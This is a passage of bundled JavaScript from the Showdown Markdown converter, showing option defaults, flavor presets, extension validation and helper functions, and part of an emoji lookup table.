        describe: "Enable support for underline. Syntax is double or triple underscores: `__underline word__`. With this option enabled, underscores no longer parses into `<em>` and `<strong>`",
        type: "boolean"
      },
      ellipsis: {
        defaultValue: true,
        describe: "Replaces three dots with the ellipsis unicode character",
        type: "boolean"
      },
      completeHTMLDocument: {
        defaultValue: false,
        describe: "Outputs a complete html document, including `<html>`, `<head>` and `<body>` tags",
        type: "boolean"
      },
      metadata: {
        defaultValue: false,
        describe: "Enable support for document metadata (defined at the top of the document between `\xAB\xAB\xAB` and `\xBB\xBB\xBB` or between `---` and `---`).",
        type: "boolean"
      },
      splitAdjacentBlockquotes: {
        defaultValue: false,
        describe: "Split adjacent blockquote blocks",
        type: "boolean"
      }
    };
    if (simple === false) {
      return JSON.parse(JSON.stringify(defaultOptions));
    }
    var ret = {};
    for (var opt in defaultOptions) {
      if (defaultOptions.hasOwnProperty(opt)) {
        ret[opt] = defaultOptions[opt].defaultValue;
      }
    }
    return ret;
  }
  function allOptionsOn() {
    "use strict";
    var options = getDefaultOpts(true), ret = {};
    for (var opt in options) {
      if (options.hasOwnProperty(opt)) {
        ret[opt] = true;
      }
    }
    return ret;
  }
  var showdown = {};
  var parsers = {};
  var extensions = {};
  var globalOptions = getDefaultOpts(true);
  var setFlavor = "vanilla";
  var flavor = {
    github: {
      omitExtraWLInCodeBlocks: true,
      simplifiedAutoLink: true,
      excludeTrailingPunctuationFromURLs: true,
      literalMidWordUnderscores: true,
      strikethrough: true,
      tables: true,
      tablesHeaderId: true,
      ghCodeBlocks: true,
      tasklists: true,
      disableForced4SpacesIndentedSublists: true,
      simpleLineBreaks: true,
      requireSpaceBeforeHeadingText: true,
      ghCompatibleHeaderId: true,
      ghMentions: true,
      backslashEscapesHTMLTags: true,
      emoji: true,
      splitAdjacentBlockquotes: true
    },
    original: {
      noHeaderId: true,
      ghCodeBlocks: false
    },
    ghost: {
      omitExtraWLInCodeBlocks: true,
      parseImgDimensions: true,
      simplifiedAutoLink: true,
      excludeTrailingPunctuationFromURLs: true,
      literalMidWordUnderscores: true,
      strikethrough: true,
      tables: true,
      tablesHeaderId: true,
      ghCodeBlocks: true,
      tasklists: true,
      smoothLivePreview: true,
      simpleLineBreaks: true,
      requireSpaceBeforeHeadingText: true,
      ghMentions: false,
      encodeEmails: true
    },
    vanilla: getDefaultOpts(true),
    allOn: allOptionsOn()
  };
  showdown.helper = {};
  showdown.extensions = {};
  showdown.setOption = function(key, value) {
    "use strict";
    globalOptions[key] = value;
    return this;
  };
  showdown.getOption = function(key) {
    "use strict";
    return globalOptions[key];
  };
  showdown.getOptions = function() {
    "use strict";
    return globalOptions;
  };
  showdown.resetOptions = function() {
    "use strict";
    globalOptions = getDefaultOpts(true);
  };
  showdown.setFlavor = function(name) {
    "use strict";
    if (!flavor.hasOwnProperty(name)) {
      throw Error(name + " flavor was not found");
    }
    showdown.resetOptions();
    var preset = flavor[name];
    setFlavor = name;
    for (var option in preset) {
      if (preset.hasOwnProperty(option)) {
        globalOptions[option] = preset[option];
      }
    }
  };
  showdown.getFlavor = function() {
    "use strict";
    return setFlavor;
  };
  showdown.getFlavorOptions = function(name) {
    "use strict";
    if (flavor.hasOwnProperty(name)) {
      return flavor[name];
    }
  };
  showdown.getDefaultOptions = function(simple) {
    "use strict";
    return getDefaultOpts(simple);
  };
  showdown.subParser = function(name, func) {
    "use strict";
    if (showdown.helper.isString(name)) {
      if (typeof func !== "undefined") {
        parsers[name] = func;
      } else {
        if (parsers.hasOwnProperty(name)) {
          return parsers[name];
        } else {
          throw Error("SubParser named " + name + " not registered!");
        }
      }
    }
  };
  showdown.extension = function(name, ext) {
    "use strict";
    if (!showdown.helper.isString(name)) {
      throw Error("Extension 'name' must be a string");
    }
    name = showdown.helper.stdExtName(name);
    if (showdown.helper.isUndefined(ext)) {
      if (!extensions.hasOwnProperty(name)) {
        throw Error("Extension named " + name + " is not registered!");
      }
      return extensions[name];
    } else {
      if (typeof ext === "function") {
        ext = ext();
      }
      if (!showdown.helper.isArray(ext)) {
        ext = [ext];
      }
      var validExtension = validate(ext, name);
      if (validExtension.valid) {
        extensions[name] = ext;
      } else {
        throw Error(validExtension.error);
      }
    }
  };
  showdown.getAllExtensions = function() {
    "use strict";
    return extensions;
  };
  showdown.removeExtension = function(name) {
    "use strict";
    delete extensions[name];
  };
  showdown.resetExtensions = function() {
    "use strict";
    extensions = {};
  };
  function validate(extension, name) {
    "use strict";
    var errMsg = name ? "Error in " + name + " extension->" : "Error in unnamed extension", ret = {
      valid: true,
      error: ""
    };
    if (!showdown.helper.isArray(extension)) {
      extension = [extension];
    }
    for (var i = 0; i < extension.length; ++i) {
      var baseMsg = errMsg + " sub-extension " + i + ": ", ext = extension[i];
      if (typeof ext !== "object") {
        ret.valid = false;
        ret.error = baseMsg + "must be an object, but " + typeof ext + " given";
        return ret;
      }
      if (!showdown.helper.isString(ext.type)) {
        ret.valid = false;
        ret.error = baseMsg + 'property "type" must be a string, but ' + typeof ext.type + " given";
        return ret;
      }
      var type = ext.type = ext.type.toLowerCase();
      if (type === "language") {
        type = ext.type = "lang";
      }
      if (type === "html") {
        type = ext.type = "output";
      }
      if (type !== "lang" && type !== "output" && type !== "listener") {
        ret.valid = false;
        ret.error = baseMsg + "type " + type + ' is not recognized. Valid values: "lang/language", "output/html" or "listener"';
        return ret;
      }
      if (type === "listener") {
        if (showdown.helper.isUndefined(ext.listeners)) {
          ret.valid = false;
          ret.error = baseMsg + '. Extensions of type "listener" must have a property called "listeners"';
          return ret;
        }
      } else {
        if (showdown.helper.isUndefined(ext.filter) && showdown.helper.isUndefined(ext.regex)) {
          ret.valid = false;
          ret.error = baseMsg + type + ' extensions must define either a "regex" property or a "filter" method';
          return ret;
        }
      }
      if (ext.listeners) {
        if (typeof ext.listeners !== "object") {
          ret.valid = false;
          ret.error = baseMsg + '"listeners" property must be an object but ' + typeof ext.listeners + " given";
          return ret;
        }
        for (var ln in ext.listeners) {
          if (ext.listeners.hasOwnProperty(ln)) {
            if (typeof ext.listeners[ln] !== "function") {
              ret.valid = false;
              ret.error = baseMsg + '"listeners" property must be an hash of [event name]: [callback]. listeners.' + ln + " must be a function but " + typeof ext.listeners[ln] + " given";
              return ret;
            }
          }
        }
      }
      if (ext.filter) {
        if (typeof ext.filter !== "function") {
          ret.valid = false;
          ret.error = baseMsg + '"filter" must be a function, but ' + typeof ext.filter + " given";
          return ret;
        }
      } else if (ext.regex) {
        if (showdown.helper.isString(ext.regex)) {
          ext.regex = new RegExp(ext.regex, "g");
        }
        if (!(ext.regex instanceof RegExp)) {
          ret.valid = false;
          ret.error = baseMsg + '"regex" property must either be a string or a RegExp object, but ' + typeof ext.regex + " given";
          return ret;
        }
        if (showdown.helper.isUndefined(ext.replace)) {
          ret.valid = false;
          ret.error = baseMsg + '"regex" extensions must implement a replace string or function';
          return ret;
        }
      }
    }
    return ret;
  }
  showdown.validateExtension = function(ext) {
    "use strict";
    var validateExtension = validate(ext, null);
    if (!validateExtension.valid) {
      console.warn(validateExtension.error);
      return false;
    }
    return true;
  };
  if (!showdown.hasOwnProperty("helper")) {
    showdown.helper = {};
  }
  showdown.helper.isString = function(a) {
    "use strict";
    return typeof a === "string" || a instanceof String;
  };
  showdown.helper.isFunction = function(a) {
    "use strict";
    var getType = {};
    return a && getType.toString.call(a) === "[object Function]";
  };
  showdown.helper.isArray = function(a) {
    "use strict";
    return Array.isArray(a);
  };
  showdown.helper.isUndefined = function(value) {
    "use strict";
    return typeof value === "undefined";
  };
  showdown.helper.forEach = function(obj2, callback) {
    "use strict";
    if (showdown.helper.isUndefined(obj2)) {
      throw new Error("obj param is required");
    }
    if (showdown.helper.isUndefined(callback)) {
      throw new Error("callback param is required");
    }
    if (!showdown.helper.isFunction(callback)) {
      throw new Error("callback param must be a function/closure");
    }
    if (typeof obj2.forEach === "function") {
      obj2.forEach(callback);
    } else if (showdown.helper.isArray(obj2)) {
      for (var i = 0; i < obj2.length; i++) {
        callback(obj2[i], i, obj2);
      }
    } else if (typeof obj2 === "object") {
      for (var prop in obj2) {
        if (obj2.hasOwnProperty(prop)) {
          callback(obj2[prop], prop, obj2);
        }
      }
    } else {
      throw new Error("obj does not seem to be an array or an iterable object");
    }
  };
  showdown.helper.stdExtName = function(s) {
    "use strict";
    return s.replace(/[_?*+\/\\.^-]/g, "").replace(/\s/g, "").toLowerCase();
  };
  function escapeCharactersCallback(wholeMatch, m1) {
    "use strict";
    var charCodeToEscape = m1.charCodeAt(0);
    return "\xA8E" + charCodeToEscape + "E";
  }
  showdown.helper.escapeCharactersCallback = escapeCharactersCallback;
  showdown.helper.escapeCharacters = function(text, charsToEscape, afterBackslash) {
    "use strict";
    var regexString = "([" + charsToEscape.replace(/([\[\]\\])/g, "\\$1") + "])";
    if (afterBackslash) {
      regexString = "\\\\" + regexString;
    }
    var regex = new RegExp(regexString, "g");
    text = text.replace(regex, escapeCharactersCallback);
    return text;
  };
  showdown.helper.unescapeHTMLEntities = function(txt) {
    "use strict";
    return txt.replace(/&quot;/g, '"').replace(/&lt;/g, "<").replace(/&gt;/g, ">").replace(/&amp;/g, "&");
  };
  var rgxFindMatchPos = function(str, left, right, flags) {
    "use strict";
    var f = flags || "", g = f.indexOf("g") > -1, x = new RegExp(left + "|" + right, "g" + f.replace(/g/g, "")), l = new RegExp(left, f.replace(/g/g, "")), pos = [], t, s, m, start, end;
    do {
      t = 0;
      while (m = x.exec(str)) {
        if (l.test(m[0])) {
          if (!t++) {
            s = x.lastIndex;
            start = s - m[0].length;
          }
        } else if (t) {
          if (!--t) {
            end = m.index + m[0].length;
            var obj2 = {
              left: { start, end: s },
              match: { start: s, end: m.index },
              right: { start: m.index, end },
              wholeMatch: { start, end }
            };
            pos.push(obj2);
            if (!g) {
              return pos;
            }
          }
        }
      }
    } while (t && (x.lastIndex = s));
    return pos;
  };
  showdown.helper.matchRecursiveRegExp = function(str, left, right, flags) {
    "use strict";
    var matchPos = rgxFindMatchPos(str, left, right, flags), results = [];
    for (var i = 0; i < matchPos.length; ++i) {
      results.push([
        str.slice(matchPos[i].wholeMatch.start, matchPos[i].wholeMatch.end),
        str.slice(matchPos[i].match.start, matchPos[i].match.end),
        str.slice(matchPos[i].left.start, matchPos[i].left.end),
        str.slice(matchPos[i].right.start, matchPos[i].right.end)
      ]);
    }
    return results;
  };
  showdown.helper.replaceRecursiveRegExp = function(str, replacement, left, right, flags) {
    "use strict";
    if (!showdown.helper.isFunction(replacement)) {
      var repStr = replacement;
      replacement = function() {
        return repStr;
      };
    }
    var matchPos = rgxFindMatchPos(str, left, right, flags), finalStr = str, lng = matchPos.length;
    if (lng > 0) {
      var bits = [];
      if (matchPos[0].wholeMatch.start !== 0) {
        bits.push(str.slice(0, matchPos[0].wholeMatch.start));
      }
      for (var i = 0; i < lng; ++i) {
        bits.push(
          replacement(
            str.slice(matchPos[i].wholeMatch.start, matchPos[i].wholeMatch.end),
            str.slice(matchPos[i].match.start, matchPos[i].match.end),
            str.slice(matchPos[i].left.start, matchPos[i].left.end),
            str.slice(matchPos[i].right.start, matchPos[i].right.end)
          )
        );
        if (i < lng - 1) {
          bits.push(str.slice(matchPos[i].wholeMatch.end, matchPos[i + 1].wholeMatch.start));
        }
      }
      if (matchPos[lng - 1].wholeMatch.end < str.length) {
        bits.push(str.slice(matchPos[lng - 1].wholeMatch.end));
      }
      finalStr = bits.join("");
    }
    return finalStr;
  };
  showdown.helper.regexIndexOf = function(str, regex, fromIndex) {
    "use strict";
    if (!showdown.helper.isString(str)) {
      throw "InvalidArgumentError: first parameter of showdown.helper.regexIndexOf function must be a string";
    }
    if (regex instanceof RegExp === false) {
      throw "InvalidArgumentError: second parameter of showdown.helper.regexIndexOf function must be an instance of RegExp";
    }
    var indexOf = str.substring(fromIndex || 0).search(regex);
    return indexOf >= 0 ? indexOf + (fromIndex || 0) : indexOf;
  };
  showdown.helper.splitAtIndex = function(str, index) {
    "use strict";
    if (!showdown.helper.isString(str)) {
      throw "InvalidArgumentError: first parameter of showdown.helper.regexIndexOf function must be a string";
    }
    return [str.substring(0, index), str.substring(index)];
  };
  showdown.helper.encodeEmailAddress = function(mail) {
    "use strict";
    var encode = [
      function(ch) {
        return "&#" + ch.charCodeAt(0) + ";";
      },
      function(ch) {
        return "&#x" + ch.charCodeAt(0).toString(16) + ";";
      },
      function(ch) {
        return ch;
      }
    ];
    mail = mail.replace(/./g, function(ch) {
      if (ch === "@") {
        ch = encode[Math.floor(Math.random() * 2)](ch);
      } else {
        var r = Math.random();
        ch = r > 0.9 ? encode[2](ch) : r > 0.45 ? encode[1](ch) : encode[0](ch);
      }
      return ch;
    });
    return mail;
  };
  showdown.helper.padEnd = function padEnd(str, targetLength, padString) {
    "use strict";
    targetLength = targetLength >> 0;
    padString = String(padString || " ");
    if (str.length > targetLength) {
      return String(str);
    } else {
      targetLength = targetLength - str.length;
      if (targetLength > padString.length) {
        padString += padString.repeat(targetLength / padString.length);
      }
      return String(str) + padString.slice(0, targetLength);
    }
  };
  if (typeof console === "undefined") {
    console = {
      warn: function(msg) {
        "use strict";
        alert(msg);
      },
      log: function(msg) {
        "use strict";
        alert(msg);
      },
      error: function(msg) {
        "use strict";
        throw msg;
      }
    };
  }
  showdown.helper.regexes = {
    asteriskDashAndColon: /([*_:~])/g
  };
  showdown.helper.emojis = {
    "+1": "\u{1F44D}",
    "-1": "\u{1F44E}",
    "100": "\u{1F4AF}",
    "1234": "\u{1F522}",
    "1st_place_medal": "\u{1F947}",
    "2nd_place_medal": "\u{1F948}",
    "3rd_place_medal": "\u{1F949}",
    "8ball": "\u{1F3B1}",
    "a": "\u{1F170}\uFE0F",
    "ab": "\u{1F18E}",
    "abc": "\u{1F524}",
    "abcd": "\u{1F521}",
    "accept": "\u{1F251}",
    "aerial_tramway": "\u{1F6A1}",
    "airplane": "\u2708\uFE0F",
    "alarm_clock": "\u23F0",
    "alembic": "\u2697\uFE0F",
    "alien": "\u{1F47D}",
    "ambulance": "\u{1F691}",
    "amphora": "\u{1F3FA}",
    "anchor": "\u2693\uFE0F",
    "angel": "\u{1F47C}",
    "anger": "\u{1F4A2}",
    "angry": "\u{1F620}",
    "anguished": "\u{1F627}",
    "ant": "\u{1F41C}",
    "apple": "\u{1F34E}",
    "aquarius": "\u2652\uFE0F",
    "aries": "\u2648\uFE0F",
    "arrow_backward": "\u25C0\uFE0F",
    "arrow_double_down": "\u23EC",
    "arrow_double_up": "\u23EB",
    "arrow_down": "\u2B07\uFE0F",
    "arrow_down_small": "\u{1F53D}",
    "arrow_forward": "\u25B6\uFE0F",
    "arrow_heading_down": "\u2935\uFE0F",
    "arrow_heading_up": "\u2934\uFE0F",
    "arrow_left": "\u2B05\uFE0F",
    "arrow_lower_left": "\u2199\uFE0F",
    "arrow_lower_right": "\u2198\uFE0F",
    "arrow_right": "\u27A1\uFE0F",
    "arrow_right_hook": "\u21AA\uFE0F",
    "arrow_up": "\u2B06\uFE0F",
    "arrow_up_down": "\u2195\uFE0F",
    "arrow_up_small": "\u{1F53C}",
    "arrow_upper_left": "\u2196\uFE0F",
    "arrow_upper_right": "\u2197\uFE0F",
    "arrows_clockwise": "\u{1F503}",
    "arrows_counterclockwise": "\u{1F504}",
    "art": "\u{1F3A8}",
    "articulated_lorry": "\u{1F69B}",
    "artificial_satellite": "\u{1F6F0}",
    "astonished": "\u{1F632}",
    "athletic_shoe": "\u{1F45F}",
    "atm": "\u{1F3E7}",
    "atom_symbol": "\u269B\uFE0F",
    "avocado": "\u{1F951}",
    "b": "\u{1F171}\uFE0F",
    "baby": "\u{1F476}",
    "baby_bottle": "\u{1F37C}",
    "baby_chick": "\u{1F424}",
    "baby_symbol": "\u{1F6BC}",
    "back": "\u{1F519}",
    "bacon": "\u{1F953}",
    "badminton": "\u{1F3F8}",
    "baggage_claim": "\u{1F6C4}",
    "baguette_bread": "\u{1F956}",
    "balance_scale": "\u2696\uFE0F",
    "balloon": "\u{1F388}",
    "ballot_box": "\u{1F5F3}",
    "ballot_box_with_check": "\u2611\uFE0F",
    "bamboo": "\u{1F38D}",
    "banana": "\u{1F34C}",
    "bangbang": "\u203C\uFE0F",
    "bank": "\u{1F3E6}",
    "bar_chart": "\u{1F4CA}",
    "barber": "\u{1F488}",
    "baseball": "\u26BE\uFE0F",
    "basketball": "\u{1F3C0}",
    "basketball_man": "\u26F9\uFE0F",
    "basketball_woman": "\u26F9\uFE0F&zwj;\u2640\uFE0F",
    "bat": "\u{1F987}",
    "bath": "\u{1F6C0}",
    "bathtub": "\u{1F6C1}",
    "battery": "\u{1F50B}",
    "beach_umbrella": "\u{1F3D6}",
    "bear": "\u{1F43B}",
    "bed": "\u{1F6CF}",
    "bee": "\u{1F41D}",
    "beer": "\u{1F37A}",
    "beers": "\u{1F37B}",
    "beetle": "\u{1F41E}",
    "beginner": "\u{1F530}",
    "bell": "\u{1F514}",
    "bellhop_bell": "\u{1F6CE}",
    "bento": "\u{1F371}",
    "biking_man": "\u{1F6B4}",
    "bike": "\u{1F6B2}",
    "biking_woman": "\u{1F6B4}&zwj;\u2640\uFE0F",
    "bikini": "\u{1F459}",
    "biohazard": "\u2623\uFE0F",
    "bird": "\u{1F426}",
    "birthday": "\u{1F382}",
    "black_circle": "\u26AB\uFE0F",
    "black_flag": "\u{1F3F4}",
    "black_heart": "\u{1F5A4}",
    "black_joker": "\u{1F0CF}",
    "black_large_square": "\u2B1B\uFE0F",
    "black_medium_small_square": "\u25FE\uFE0F",
    "black_medium_square": "\u25FC\uFE0F",
    "black_nib": "\u2712\uFE0F",
    "black_small_square": "\u25AA\uFE0F",
    "black_square_button": "\u{1F532}",
    "blonde_man": "\u{1F471}",
    "blonde_woman": "\u{1F471}&zwj;\u2640\uFE0F",
    "blossom": "\u{1F33C}",
    "blowfish": "\u{1F421}",
    "blue_book": "\u{1F4D8}",
    "blue_car": "\u{1F699}",
    "blue_heart": "\u{1F499}",
    "blush": "\u{1F60A}",
    "boar": "\u{1F417}",
    "boat": "\u26F5\uFE0F",
    "bomb": "\u{1F4A3}",
    "book": "\u{1F4D6}",
    "bookmark": "\u{1F516}",
    "bookmark_tabs": "\u{1F4D1}",
    "books": "\u{1F4DA}",
    "boom": "\u{1F4A5}",
    "boot": "\u{1F462}",
    "bouquet": "\u{1F490}",
    "bowing_man": "\u{1F647}",
    "bow_and_arrow": "\u{1F3F9}",
    "bowing_woman": "\u{1F647}&zwj;\u2640\uFE0F",
    "bowling": "\u{1F3B3}",
    "boxing_glove": "\u{1F94A}",
    "boy": "\u{1F466}",
    "bread": "\u{1F35E}",
    "bride_with_veil": "\u{1F470}",
    "bridge_at_night": "\u{1F309}",
    "briefcase": "\u{1F4BC}",
    "broken_heart": "\u{1F494}",
    "bug": "\u{1F41B}",
    "building_construction": "\u{1F3D7}",
    "bulb": "\u{1F4A1}",
    "bullettrain_front": "\u{1F685}",
    "bullettrain_side": "\u{1F684}",
    "burrito": "\u{1F32F}",
    "bus": "\u{1F68C}",
    "business_suit_levitating": "\u{1F574}",
    "busstop": "\u{1F68F}",
    "bust_in_silhouette": "\u{1F464}",
    "busts_in_silhouette": "\u{1F465}",
    "butterfly": "\u{1F98B}",
    "cactus": "\u{1F335}",
    "cake": "\u{1F370}",
    "calendar": "\u{1F4C6}",
    "call_me_hand": "\u{1F919}",
    "calling": "\u{1F4F2}",
    "camel": "\u{1F42B}",
    "camera": "\u{1F4F7}",
    "camera_flash": "\u{1F4F8}",
    "camping": "\u{1F3D5}",
    "cancer": "\u264B\uFE0F",
    "candle": "\u{1F56F}",
    "candy": "\u{1F36C}",
    "canoe": "\u{1F6F6}",
    "capital_abcd": "\u{1F520}",
    "capricorn": "\u2651\uFE0F",
    "car": "\u{1F697}",
    "card_file_box": "\u{1F5C3}",
    "card_index": "\u{1F4C7}",
    "card_index_dividers": "\u{1F5C2}",
    "carousel_horse": "\u{1F3A0}",
    "carrot": "\u{1F955}",
    "cat": "\u{1F431}",
    "cat2": "\u{1F408}",
    "cd": "\u{1F4BF}",
    "chains": "\u26D3",
    "champagne": "\u{1F37E}",
    "chart": "\u{1F4B9}",
    "chart_with_downwards_trend": "\u{1F4C9}",
    "chart_with_upwards_trend": "\u{1F4C8}",
    "checkered_flag": "\u{1F3C1}",
    "cheese": "\u{1F9C0}",
    "cherries": "\u{1F352}",
    "cherry_blossom": "\u{1F338}",
    "chestnut": "\u{1F330}",
    "chicken": "\u{1F414}",
    "children_crossing": "\u{1F6B8}",
    "chipmunk": "\u{1F43F}",
    "chocolate_bar": "\u{1F36B}",
    "christmas_tree": "\u{1F384}",
    "church": "\u26EA\uFE0F",
    "cinema": "\u{1F3A6}",
    "circus_tent": "\u{1F3AA}",
    "city_sunrise": "\u{1F307}",
    "city_sunset": "\u{1F306}",
    "cityscape": "\u{1F3D9}",
    "cl": "\u{1F191}",
    "clamp": "\u{1F5DC}",
    "clap": "\u{1F44F}",
    "clapper": "\u{1F3AC}",
    "classical_building": "\u{1F3DB}",
    "clinking_glasses": "\u{1F942}",
    "clipboard": "\u{1F4CB}",
    "clock1": "\u{1F550}",
    "clock10": "\u{1F559}",
    "clock1030": "\u{1F565}",
    "clock11": "\u{1F55A}",
    "clock1130": "\u{1F566}",
    "clock12": "\u{1F55B}",
    "clock1230": "\u{1F567}",
    "clock130": "\u{1F55C}",
    "clock2": "\u{1F551}",
    "clock230": "\u{1F55D}",
    "clock3": "\u{1F552}",
    "clock330": "\u{1F55E}",
    "clock4": "\u{1F553}",
    "clock430": "\u{1F55F}",
    "clock5": "\u{1F554}",
    "clock530": "\u{1F560}",
    "clock6": "\u{1F555}",
    "clock630": "\u{1F561}",
    "clock7": "\u{1F556}",
    "clock730": "\u{1F562}",
    "clock8": "\u{1F557}",
    "clock830": "\u{1F563}",
    "clock9": "\u{1F558}",
    "clock930": "\u{1F564}",
    "closed_book": "\u{1F4D5}",
    "closed_lock_with_key": "\u{1F510}",
    "closed_umbrella": "\u{1F302}",
    "cloud": "\u2601\uFE0F",
    "cloud_with_lightning": "\u{1F329}",
    "cloud_with_lightning_and_rain": "\u26C8",
    "cloud_with_rain": "\u{1F327}",
    "cloud_with_snow": "\u{1F328}",
    "clown_face": "\u{1F921}",
    "clubs": "\u2663\uFE0F",
    "cocktail": "\u{1F378}",
    "coffee": "\u2615\uFE0F",
    "coffin": "\u26B0\uFE0F",
    "cold_sweat": "\u{1F630}",
    "comet": "\u2604\uFE0F",
    "computer": "\u{1F4BB}",
    "computer_mouse": "\u{1F5B1}",
    "confetti_ball": "\u{1F38A}",
    "confounded": "\u{1F616}",
    "confused": "\u{1F615}",
    "congratulations": "\u3297\uFE0F",
    "construction": "\u{1F6A7}",
    "construction_worker_man": "\u{1F477}",
    "construction_worker_woman": "\u{1F477}&zwj;\u2640\uFE0F",
    "control_knobs": "\u{1F39B}",
    "convenience_store": "\u{1F3EA}",
    "cookie": "\u{1F36A}",
    "cool": "\u{1F192}",
    "policeman": "\u{1F46E}",
    "copyright": "\xA9\uFE0F",
    "corn": "\u{1F33D}",
    "couch_and_lamp": "\u{1F6CB}",
    "couple": "\u{1F46B}",
    "couple_with_heart_woman_man": "\u{1F491}",
    "couple_with_heart_man_man": "\u{1F468}&zwj;\u2764\uFE0F&zwj;\u{1F468}",
    "couple_with_heart_woman_woman": "\u{1F469}&zwj;\u2764\uFE0F&zwj;\u{1F469}",
    "couplekiss_man_man": "\u{1F468}&zwj;\u2764\uFE0F&zwj;\u{1F48B}&zwj;\u{1F468}",
    "couplekiss_man_woman": "\u{1F48F}",
    "couplekiss_woman_woman": "\u{1F469}&zwj;\u2764\uFE0F&zwj;\u{1F48B}&zwj;\u{1F469}",
    "cow": "\u{1F42E}",
    "cow2": "\u{1F404}",
    "cowboy_hat_face": "\u{1F920}",
    "crab": "\u{1F980}",
    "crayon": "\u{1F58D}",
    "credit_card": "\u{1F4B3}",
    "crescent_moon": "\u{1F319}",
    "cricket": "\u{1F3CF}",
    "crocodile": "\u{1F40A}",
    "croissant": "\u{1F950}",
    "crossed_fingers": "\u{1F91E}",
    "crossed_flags": "\u{1F38C}",
    "crossed_swords": "\u2694\uFE0F",
    "crown": "\u{1F451}",
    "cry": "\u{1F622}",
    "crying_cat_face": "\u{1F63F}",
    "crystal_ball": "\u{1F52E}",
    "cucumber": "\u{1F952}",
    "cupid": "\u{1F498}",
    "curly_loop": "\u27B0",
    "currency_exchange": "\u{1F4B1}",
    "curry": "\u{1F35B}",
    "custard": "\u{1F36E}",
    "customs": "\u{1F6C3}",
    "cyclone": "\u{1F300}",
    "dagger": "\u{1F5E1}",
    "dancer": "\u{1F483}",
    "dancing_women": "\u{1F46F}",
    "dancing_men": "\u{1F46F}&zwj;\u2642\uFE0F",
    "dango": "\u{1F361}",
    "dark_sunglasses": "\u{1F576}",
    "dart": "\u{1F3AF}",
    "dash": "\u{1F4A8}",
    "date": "\u{1F4C5}",
    "deciduous_tree": "\u{1F333}",
    "deer": "\u{1F98C}",
    "department_store": "\u{1F3EC}",
    "derelict_house": "\u{1F3DA}",
    "desert": "\u{1F3DC}",
    "desert_island": "\u{1F3DD}",
    "desktop_computer": "\u{1F5A5}",
    "male_detective": "\u{1F575}\uFE0F",
    "diamond_shape_with_a_dot_inside": "\u{1F4A0}",
    "diamonds": "\u2666\uFE0F",
    "disappointed": "\u{1F61E}",
    "disappointed_relieved": "\u{1F625}",
    "dizzy": "\u{1F4AB}",
    "dizzy_face": "\u{1F635}",
    "do_not_litter": "\u{1F6AF}",
    "dog": "\u{1F436}",
    "dog2": "\u{1F415}",
    "dollar": "\u{1F4B5}",
    "dolls": "\u{1F38E}",
    "dolphin": "\u{1F42C}",
    "door": "\u{1F6AA}",
    "doughnut": "\u{1F369}",
    "dove": "\u{1F54A}",
    "dragon": "\u{1F409}",
    "dragon_face": "\u{1F432}",
    "dress": "\u{1F457}",
    "dromedary_camel": "\u{1F42A}",
    "drooling_face": "\u{1F924}",
    "droplet": "\u{1F4A7}",
    "drum": "\u{1F941}",
    "duck": "\u{1F986}",
    "dvd": "\u{1F4C0}",
    "e-mail": "\u{1F4E7}",
    "eagle": "\u{1F985}",
    "ear": "\u{1F442}",
    "ear_of_rice": "\u{1F33E}",
    "earth_africa": "\u{1F30D}",
    "earth_americas": "\u{1F30E}",
    "earth_asia": "\u{1F30F}",
    "egg": "\u{1F95A}",
    "eggplant": "\u{1F346}",
    "eight_pointed_black_star": "\u2734\uFE0F",
    "eight_spoked_asterisk": "\u2733\uFE0F",
    "electric_plug": "\u{1F50C}",
    "elephant": "\u{1F418}",
    "email": "\u2709\uFE0F",
    "end": "\u{1F51A}",
    "envelope_with_arrow": "\u{1F4E9}",
    "euro": "\u{1F4B6}",
    "european_castle": "\u{1F3F0}",
    "european_post_office": "\u{1F3E4}",
    "evergreen_tree": "\u{1F332}",
    "exclamation": "\u2757\uFE0F",
    "expressionless": "\u{1F611}",
    "eye": "\u{1F441}",
    "eye_speech_bubble": "\u{1F441}&zwj;\u{1F5E8}",
    "eyeglasses": "\u{1F453}",
    "eyes": "\u{1F440}",
    "face_with_head_bandage": "\u{1F915}",
    "face_with_thermometer": "\u{1F912}",
    "fist_oncoming": "\u{1F44A}",
    "factory": "\u{1F3ED}",
    "fallen_leaf": "\u{1F342}",
    "family_man_woman_boy": "\u{1F46A}",
    "family_man_boy": "\u{1F468}&zwj;\u{1F466}",
    "family_man_boy_boy": "\u{1F468}&zwj;\u{1F466}&zwj;\u{1F466}",
    "family_man_girl": "\u{1F468}&zwj;\u{1F467}",
    "family_man_girl_boy": "\u{1F468}&zwj;\u{1F467}&zwj;\u{1F466}",
    "family_man_girl_girl": "\u{1F468}&zwj;\u{1F467}&zwj;\u{1F467}",
    "family_man_man_boy": "\u{1F468}&zwj;\u{1F468}&zwj;\u{1F466}",
    "family_man_man_boy_boy": "\u{1F468}&zwj;\u{1F468}&zwj;\u{1F466}&zwj;\u{1F466}",
    "family_man_man_girl": "\u{1F468}&zwj;\u{1F468}&zwj;\u{1F467}",
    "family_man_man_girl_boy": "\u{1F468}&zwj;\u{1F468}&zwj;\u{1F467}&zwj;\u{1F466}",
    "family_man_man_girl_girl": "\u{1F468}&zwj;\u{1F468}&zwj;\u{1F467}&zwj;\u{1F467}",
    "family_man_woman_boy_boy": "\u{1F468}&zwj;\u{1F469}&zwj;\u{1F466}&zwj;\u{1F466}",
    "family_man_woman_girl": "\u{1F468}&zwj;\u{1F469}&zwj;\u{1F467}",
    "family_man_woman_girl_boy": "\u{1F468}&zwj;\u{1F469}&zwj;\u{1F467}&zwj;\u{1F466}",
    "family_man_woman_girl_girl": "\u{1F468}&zwj;\u{1F469}&zwj;\u{1F467}&zwj;\u{1F467}",
    "family_woman_boy": "\u{1F469}&zwj;\u{1F466}",
    "family_woman_boy_boy": "\u{1F469}&zwj;\u{1F466}&zwj;\u{1F466}",
    "family_woman_girl": "\u{1F469}&zwj;\u{1F467}",
    "family_woman_girl_boy": "\u{1F469}&zwj;\u{1F467}&zwj;\u{1F466}",
    "family_woman_girl_girl": "\u{1F469}&zwj;\u{1F467}&zwj;\u{1F467}",
    "family_woman_woman_boy": "\u{1F469}&zwj;\u{1F469}&zwj;\u{1F466}",
    "family_woman_woman_boy_boy": "\u{1F469}&zwj;\u{1F469}&zwj;\u{1F466}&zwj;\u{1F466}",
    "family_woman_woman_girl": "\u{1F469}&zwj;\u{1F469}&zwj;\u{1F467}",
    "family_woman_woman_girl_boy": "\u{1F469}&zwj;\u{1F469}&zwj;\u{1F467}&zwj;\u{1F466}",
    "family_woman_woman_girl_girl": "\u{1F469}&zwj;\u{1F469}&zwj;\u{1F467}&zwj;\u{1F467}",
    "fast_forward": "\u23E9",
    "fax": "\u{1F4E0}",
